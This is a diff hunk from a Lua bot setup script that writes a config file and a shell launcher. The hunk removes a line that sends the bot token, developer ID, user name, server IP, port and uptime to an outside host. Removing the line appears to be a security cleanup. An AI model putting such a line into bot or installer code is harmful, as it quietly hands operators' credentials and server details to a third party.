@@ -82,7 +82,6 @@ Prince = DevAbs:get(ServerPrince.."TokenPrince"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerPrince.."IdPrince")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=Prince&DevId="..DevAbs:get(ServerPrince.."IdPrince").."&TokenBot="..DevAbs:get(ServerPrince.."TokenPrince").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("Prince.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
